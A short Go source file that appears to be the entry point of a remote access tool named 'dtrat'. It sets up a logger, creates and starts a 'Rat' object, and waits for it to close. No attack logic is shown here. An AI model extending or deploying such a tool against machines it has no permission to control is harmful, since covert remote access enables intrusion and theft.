package main

import (
	"dtrat/rat"

	"github.com/deuterium34/dlog"
)

func main() {
	dlog.GLogger = dlog.NewDefaultLogger()

	r, err := rat.NewRat()
	if err != nil {
		panic(err)
	}

	r.Start()

	closeReason := <-r.CloseCh
	if closeReason != nil {
		panic(closeReason)
	}
}
